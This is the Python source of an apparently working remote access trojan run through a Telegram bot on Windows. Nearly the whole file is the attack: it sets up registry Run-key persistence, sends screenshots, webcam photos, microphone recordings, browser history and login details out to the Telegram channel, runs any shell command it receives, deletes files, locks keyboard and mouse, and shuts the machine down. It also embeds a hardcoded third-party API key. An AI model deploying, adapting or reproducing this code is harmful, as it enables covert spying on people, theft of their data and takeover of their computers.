import socket
import requests
import pyscreenshot
import webbrowser
import pywhatkit
import telebot
import cv2
import platform
from pynput.keyboard import Key, Controller
import os
import winreg
import pyautogui
import pyttsx3
import tkinter as tk
from playsound import playsound
import docx
import wave
import pyaudio
from pytube import YouTube
import urllib.request
import ctypes
from win10toast import ToastNotifier
import psutil
from browser_history import get_history

while True:
    PathFile = os.path.abspath(__file__)[:-2]+'exe'

    def startup():
        start_up_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                                      winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(start_up_key, 'name', 0, winreg.REG_SZ, PathFile)
        winreg.CloseKey(start_up_key)

    startup()

    bot = telebot.TeleBot('YOUR TOKEN')

    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        bot.reply_to(message, "Welcome to my remote control bot. Use the /help command to see the available actions.")

    @bot.message_handler(commands=['help'])
    def show_help(message):
        help_text = """Choose what you want to do:
/ip - show local and public IP address
/screenshot - take a screenshot
/web - open a webpage
/sysinfo - watch system information
/whatsapp - send a WhatsApp messaged
/webcam - take a photo with the webcam
/micro - make audio from micro
/volume - edit volume
/files - control files
/shutdown - shutdown pc
/press - press any key
/alert - make a popup with ur own text
/say - you can say something on pc
/download - download something from internet
/cmd - open cmd
/play - play mp3 or mp4 file
/block - block input from keyboard and mouse
/unblock - unblock input from keyboard and mouse
/location - see location by ip
/push - make windows push notice
/wallpaper - set wallpaper"""

        bot.reply_to(message, help_text)

    @bot.message_handler(commands=['ip'])
    def show_ip(message):
        hostname = socket.gethostname()
        ipaddress = socket.gethostbyname(hostname)
        public_ip = requests.get('http://api.ipify.org').text
        ip_text = f'Host: {hostname}\nLocal ip: {ipaddress}\nPublic ip: {public_ip}'
        bot.reply_to(message, ip_text)

    @bot.message_handler(commands=['screenshot'])
    def take_screenshot(message):
        img = pyscreenshot.grab(bbox=(10, 10, 1920, 1080))
        img.save('screenshot.png')
        with open('screenshot.png', 'rb') as file:
            bot.send_photo(message.chat.id, file)

    @bot.message_handler(commands=['web'])
    def open_webpage(message):
        msg = bot.reply_to(message, "Type webpage address")
        bot.register_next_step_handler(msg, _process_webpage)

    def _process_webpage(message):
        webaddress = message.text
        webbrowser.open(webaddress)
        bot.reply_to(message, f"Opening {webaddress}")

    @bot.message_handler(commands=['whatsapp'])
    def send_whatsapp(message):
        msg = bot.reply_to(message, "Enter phone number")
        bot.register_next_step_handler(msg, _process_phone_number)

    def _process_phone_number(message):
        phonenumber = message.text
        msg = bot.reply_to(message, "Enter your message")
        bot.register_next_step_handler(msg, _process_whatsapp_message, phonenumber)

    def _process_whatsapp_message(message, phonenumber):
        msg = message.text
        time_msg = bot.reply_to(message, "Enter the time of dispatch in hours and minutes (in HH:MM format)")
        bot.register_next_step_handler(time_msg, _process_whatsapp_time, phonenumber, msg)

    def _process_whatsapp_time(message, phonenumber, msg):
        time_str = message.text
        time_parts = time_str.split(':')
        time_hour = int(time_parts[0])
        time_min = int(time_parts[1])
        pywhatkit.sendwhatmsg(phonenumber, msg, time_hour, time_min)
        bot.reply_to(message, f"Sending a message to {phonenumber} at {time_hour:02d}:{time_min:02d}.")

    @bot.message_handler(commands=['webcam'])
    def take_photo(message):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite('photo.jpg', frame)
        cap.release()
        with open('photo.jpg', 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

    @bot.message_handler(commands=['sysinfo'])
    def get_system_info(message):
        m_system = platform.uname()
        user = os.getlogin()
        root = tk.Tk()
        width_px = root.winfo_screenwidth()
        height_px = root.winfo_screenheight()
        root.destroy()

        sysinfo_message = f'System: {m_system.system}\n' \
                          f'Node name: {m_system.node}\n' \
                          f'Release: {m_system.release}\n' \
                          f'Version: {m_system.version}\n' \
                          f'Machine: {m_system.machine}\n' \
                          f'Processor: {m_system.processor}' \
                          f'User: {user}' \
                          f'{width_px}x{height_px}'

        bot.reply_to(message, sysinfo_message)

    keyboard1 = Controller()

    @bot.message_handler(commands=['volume'])
    def volume_handler(message):
        volume = message.text.split()[1]
        if volume == 'min':
            for i in range(100):
                keyboard1.press(Key.media_volume_down)
                keyboard1.release(Key.media_volume_down)
        elif volume == 'max':
            for b in range(100):
                keyboard1.press(Key.media_volume_up)
                keyboard1.release(Key.media_volume_up)

    @bot.message_handler(commands=['files'])
    def handle_files_command(message):
        path = 'C:/'
        folders = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
        bot.send_message(message.chat.id, "Folders in C:/:\n" + '\n'.join(folders))
        markup = telebot.types.ReplyKeyboardMarkup()
        markup.row('open folder', 'open file')
        markup.row('delete', 'rename')
        markup.row('create word', 'create txt')
        markup.row('assign size of file')

        msg = bot.reply_to(message, "What do you want to do?", reply_markup=markup)
        bot.register_next_step_handler(msg, handle_files_action)

    def handle_files_action(message):
        action = message.text.lower()

        if action == 'open folder':
            msg = bot.reply_to(message, "Enter folder path")
            bot.register_next_step_handler(msg, handle_open_folder)
        elif action == 'rename':
            bot.register_next_step_handler(message, rename_file_or_folder)
        elif action == 'delete':
            bot.register_next_step_handler(message, delete_files)
        elif action == 'open file':
            bot.register_next_step_handler(message, open_file)
        elif action == 'create word':
            bot.register_next_step_handler(message, word_x_name)
        elif action == 'create txt':
            bot.register_next_step_handler(message, txt_x_name)
        elif action == 'assign size of file':
            bot.register_next_step_handler(message, assign_size_path)
        else:
            bot.reply_to(message, "Invalid action. Please choose another.")

    def txt_x_name(message):
        msg = bot.reply_to(message, 'Enter file name')
        bot.register_next_step_handler(msg, txt_x_create)

    def txt_x_create(message):
        msg = message.text
        with open(msg, 'w') as file:
            file.write(msg)

        bot.reply_to(message, 'Txt doc was successfully created!')

    def word_x_name(message):
        msg = bot.reply_to(message, 'Enter file name')
        bot.register_next_step_handler(msg, word_x_create)

    def word_x_create(message):
        msg = message.text
        doc = docx.Document()
        doc.save(msg)

        bot.reply_to(message, 'Word doc was successfully created!')

    def handle_open_folder(message):
        path = message.text
        items = os.listdir(path)
        bot.reply_to(message, "Items in " + path + ":\n" + "\n".join(items))

    def rename_file_or_folder(message):
        bot.send_message(message.chat.id, "Enter what you want to rename: 'file' or 'folder'")
        bot.register_next_step_handler(message, rename_file_or_folder_step2)

    def rename_file_or_folder_step2(message):
        action_rename = message.text.lower()

        if action_rename == 'file':
            bot.send_message(message.chat.id,
                             "Enter old and new names separated by a space, like this: 'old_name new_name'")
            bot.register_next_step_handler(message, rename_file_step3)

        elif action_rename == 'folder':
            bot.send_message(message.chat.id, "Enter the path to the folder you want to rename")
            bot.register_next_step_handler(message, rename_folder_step3)

        else:
            bot.send_message(message.chat.id, "Invalid input. Enter either 'file' or 'folder'")
            bot.register_next_step_handler(message, rename_file_or_folder_step2)

    def rename_file_step3(message):
        try:
            old_name, new_name = message.text.split()
            os.rename(old_name, new_name)
            bot.send_message(message.chat.id, f"File '{old_name}' was renamed to '{new_name}'")
        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

    def rename_folder_step3(message):
        try:
            old_folder = message.text
            bot.send_message(message.chat.id, "Enter the new path for the folder")
            bot.register_next_step_handler(message, rename_folder_step4, old_folder)
        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

    def rename_folder_step4(message, old_folder):
        try:
            new_folder = message.text
            os.rename(old_folder, new_folder)
            bot.send_message(message.chat.id, f"Folder '{old_folder}' was renamed to '{new_folder}'")
        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

    def delete_files(message):
        bot.send_message(message.chat.id, "Enter path to file or folder you want to remove")
        bot.register_next_step_handler(message, remove_file)

    def remove_file(message):
        file_path = message.text.strip()

        try:
            os.remove(file_path)
            bot.send_message(message.chat.id, f"File {file_path} was deleted successfully!")
        except IsADirectoryError:
            os.rmdir(file_path)
            bot.send_message(message.chat.id, f"Directory {file_path} was deleted successfully!")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")

    def open_file(message):
        bot.reply_to(message, "Enter file path u need to open")
        bot.register_next_step_handler(message, process_file_path_step)

    def process_file_path_step(message):
        file_path = message.text
        if not os.path.isfile(file_path):
            bot.reply_to(message, f"File {file_path} not found!")
        else:
            with open(file_path, 'r') as file1:
                file_contents = file1.read()
                open(file_contents)

    def assign_size_path(message):
        bot.reply_to(message, 'Send path/file path')
        bot.register_next_step_handler(message, assign_size)

    def assign_size(message):
        file_path = message.text
        size = 0

        for ele in os.scandir(file_path):
            size+=os.path.getsize(ele)

        bot.reply_to(message, size)

    @bot.message_handler(commands=['shutdown'])
    def shutdown_function(message):
        msg = bot.reply_to(message, "Shutdown?")
        bot.register_next_step_handler(msg, shutdown)

    def shutdown(message):
        shut = message.text.lower()

        if shut == 'yes':
            os.system("shutdown /r /t 1")

    @bot.message_handler(commands=['press'])
    def choose_key(message):
        key = bot.reply_to(message, "Choose key you want to press")
        bot.register_next_step_handler(key, press_key)

    def press_key(message):
        key_press = message.text.lower()
        pyautogui.press(key_press)
        bot.reply_to(message, f"Key {key_press} was pressed!")

    @bot.message_handler(commands=['alert'])
    def handle_message(message):
        msg = bot.reply_to(message, "Enter message you want to popup")
        bot.register_next_step_handler(msg, alert)

    def alert(message):
        alert_text = message.text
        pyautogui.alert(alert_text, title='Python')
        bot.reply_to(message, "Message was delivered!")

    @bot.message_handler(commands=['say'])
    def text_say(message):
        msg = bot.reply_to(message, 'Enter what to say')
        bot.register_next_step_handler(msg, say)

    def say(message):
        msg = message.text
        engine = pyttsx3.init()
        engine.say(msg)
        engine.runAndWait()
        bot.reply_to(message, 'The message has been played!')

    @bot.message_handler(commands=['unblock'])
    def unblock_keyboard_mouse(message):
        screen_width, screen_height = pyautogui.size()
        pyautogui.moveTo(screen_width / 2, screen_height / 2)

        pyautogui.KEYBOARD_KEYS = ["\t", "\n", "\r", " ", "!", "\"", "#", "$", "%", "&", "'", "(", ")", "*", "+", ",",
                                   "-", ".", "/", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", ";", "<", "=",
                                   ">", "?", "@", "[", "\\", "]", "^", "_", "`", "a", "b", "c", "d", "e", "f", "g", "h",
                                   "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y",
                                   "z", "{", "|", "}", "~", "accept", "add", "alt", "altleft", "altright", "apps",
                                   "backspace", "browserback", "browserfavorites", "browserforward", "browserhome",
                                   "browserrefresh", "browsersearch", "browserstop", "capslock", "clear", "convert",
                                   "ctrl", "ctrlleft", "ctrlright", "decimal", "del", "delete", "divide", "down", "end",
                                   "enter", "esc", "escape", "execute", "f1", "f10", "f11", "f12", "f13", "f14", "f15",
                                   "f16", "f17", "f18", "f19", "f2", "f20", "f21", "f22", "f23", "f24", "f3", "f4",
                                   "f5", "f6", "f7", "f8", "f9", "final", "fn", "hanguel", "hangul", "hanja", "help",
                                   "home", "insert", "junja", "kana", "kanji", "launchapp1", "launchapp2", "launchmail",
                                   "launchmediaselect", "left", "modechange", "multiply", "nexttrack", "nonconvert",
                                   "num0", "num1", "num2", "num3", "num4", "num5", "num6", "num7", "num8", "num9",
                                   "numlock", "pagedown", "pageup", "pause", "pgdn", "pgup", "playpause", "prevtrack",
                                   "print", "printscreen", "prntscrn", "prtsc", "prtscr", "return", "right",
                                   "scrolllock", "select", "separator", "shift", "shiftleft", "shiftright", "sleep",
                                   "space", "stop", "subtract", "tab", "up", "volumedown", "volumemute", "volumeup",
                                   "win", "winleft", "winright", "yen", "command", "option", "optionleft",
                                   "optionright"]

        pyautogui.mouseUp()

        bot.reply_to(message, 'Keyboard was unblocked!')

    @bot.message_handler(commands=['play'])
    def message_play(message):
        msg = bot.reply_to(message, 'Enter mp4 or mp3 or youtube')
        bot.register_next_step_handler(msg, option_play)

    def option_play(message):
        msg = message.text

        if msg == 'mp3':
            msg1 = bot.reply_to(message, 'Enter file path')
            bot.register_next_step_handler(msg1, play_mp3)

        elif msg == 'mp4':
            msg2 = bot.reply_to(message, 'Enter file path')
            bot.register_next_step_handler(msg2, play_mp4)

    def play_mp4(message):
        video_path = message.text

        os.startfile(video_path)

    def play_mp3(message):
        msg = message.text
        playsound(msg)

    @bot.message_handler(commands=['micro'])
    def micro_time(message):
        msg = bot.reply_to(message, 'Enter audio length')
        bot.register_next_step_handler(msg, micro_write)

    def micro_write(message):
        time = message.text
        audio_format = pyaudio.paInt16
        channels = 1
        sample_rate = 44100
        chunk_size = 1024
        record_seconds = float(time)

        audio = pyaudio.PyAudio()
        stream = audio.open(format=audio_format, channels=channels,
                            rate=sample_rate, input=True, frames_per_buffer=chunk_size)

        bot.send_message(message.chat.id, 'Recording...')

        frames = []
        for i in range(int(sample_rate / chunk_size * record_seconds)):
            data = stream.read(chunk_size)
            frames.append(data)

        bot.send_message(message.chat.id, "Finished recording")

        stream.stop_stream()
        stream.close()
        audio.terminate()
        wave_file = wave.open('output.wav', 'wb')
        wave_file.setnchannels(channels)
        wave_file.setsampwidth(audio.get_sample_size(audio_format))
        wave_file.setframerate(sample_rate)
        wave_file.writeframes(b''.join(frames))
        wave_file.close()

        with open('output.wav', 'rb') as audio_file:
            bot.send_voice(message.chat.id, audio_file)

    @bot.message_handler(commands=['download'])
    def download_options(message):
        msg = bot.reply_to(message, 'What you want to download youtube/vk/instagram/mp3/mp4/png?')
        bot.register_next_step_handler(msg, download_action)

    def download_action(message):
        action = message.text.lower()

        if action == 'youtube':
            bot.register_next_step_handler(message, link_youtube)
        elif action == 'vk':
            bot.register_next_step_handler(message, link_vk)
        elif action == 'mp3':
            bot.register_next_step_handler(message, link_mp3)
        else:
            bot.reply_to(message, "Invalid option. Please choose another.")

    def link_youtube(message):
        msg = bot.reply_to(message, 'Enter video link')
        bot.register_next_step_handler(msg, download_youtube)

    def download_youtube(message):
        link = message.text

        video = YouTube(link)
        bot.reply_to(message, 'Video is downloading...')
        stream = video.streams.get_highest_resolution()
        stream.download()
        bot.send_message(message, 'Video was downloaded!')

    def link_vk(message):
        msg = bot.reply_to(message, 'Enter photo link')
        bot.register_next_step_handler(msg, download_vk)

    def download_vk(message):
        link = message.text

        bot.reply_to(message, 'Photo is downloading...')
        img1 = requests.get(link)
        img1_option = open('vk' + '.jpg', 'wb')
        img1_option.write(img1.content)
        img1_option.close()
        bot.send_message(message, 'Photo was downloaded!')

    def link_mp3(message):
        msg = bot.reply_to(message, 'Enter mp3 link')
        bot.register_next_step_handler(msg, download_mp3)

    def download_mp3(message):
        link = message.text
        bot.send_message(message, 'Mp3 is downloading...')
        urllib.request.urlretrieve(link, 'mp3test')
        bot.send_message(message, 'Mp3 was downloaded!')

    @bot.message_handler(commands=['cmd'])
    def option_cmd(message):
        msg = bot.reply_to(message, 'Enter what you need to do')
        bot.register_next_step_handler(msg, action_cmd)

    def action_cmd(message):
        action = message.text

        if action == 'command':
            command = bot.reply_to(message, 'Enter command you need')
            bot.register_next_step_handler(command, command_cmd)

        elif action == 'open':
            number = bot.reply_to(message, 'Enter how much cmd you want to open')
            bot.register_next_step_handler(number, open_cmd)

        else:
            bot.reply_to(message, 'Invalid action!')

    def open_cmd(message):
        number = int(message.text)

        cmd = 0

        while cmd < number:
            cmd += 1
            os.system('start cmd')

    def command_cmd(message):
        command = message.text

        os.system(f'cmd /c "{command}"')

    @bot.message_handler(commands=['location'])
    def ip(message):

        api_key = "66cc5ed035d4ded6a42fa1ab68af2946"

        public_ip = requests.get('http://api.ipify.org').text

        response = requests.get(f"http://api.ipstack.com/{public_ip}?access_key={api_key}")

        if response.status_code == 200:
            data = response.json()
            bot.reply_to(message, f'City: {data["city"]}\nRegion: {data["region_name"]}\n'
                                  f'Country: {data["country_name"]}\nСoordinates:'
                                  f' {data["latitude"]}, {data["longitude"]}')
        else:
            bot.reply_to(message, "An error occurred while retrieving location information.")


    @bot.message_handler(commands=['push'])
    def push_message(message):
        msg = bot.reply_to(message, 'Enter the massage to push')
        bot.register_next_step_handler(msg, push)

    def push(message):
        toaster = ToastNotifier()
        message_push = '_____________________________________________________'
        name = message.text
        duration = 10

        toaster.show_toast(name, message_push, duration=duration)

    @bot.message_handler(commands=['wallpaper'])
    def image(message):
        msg = bot.reply_to(message, 'Enter file path')
        bot.register_next_step_handler(msg, image_wallpaper)

    def image_wallpaper(message):
        image_path = message.text

        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

        bot.reply_to(message, 'wallpaper has been successfully applied!')


    @bot.message_handler(commands=['block'])
    def block_input(message):
        x, y = pyautogui.position()
        msg = bot.reply_to(message, 'Keyboard and mouse was successfully blocked! Do you want to unblock?')
        bot.reply_to(message, 'Just send stop when you want to unblock')
        bot.register_next_step_handler(msg, message)
        un = message.text

        while True:
            pyautogui.FAILSAFE = False
            pyautogui.moveTo(x, y)
            pyautogui.KEYBOARD_KEYS = []

            if un == 'stop':
                break
    
    @bot.message_handler(commands=['battery'])
    def show_bat(message):
        battery = psutil.sensors_battery()
        plugged = battery.power_plugged
        percent = battery.percent

        if plugged:
            bot.reply_to(message, f'Charge plugged, battery = {percent}%')
            
        else:
            bot.reply_to(message, f'Charge unplugged, battery = {percent}%')

    @bot.message_handler(commands=['history'])
    def get_history1(message):
        outputs = get_history()
        his = outputs.histories

        bot.reply_to(message, f'There are browser history:\n{his}')

    @bot.message_handler(commands=['getlogin'])
    def get_login(message):
        user = os.getlogin()
        bot.reply_to(message, f'Login: {user}')

    bot.infinity_polling()
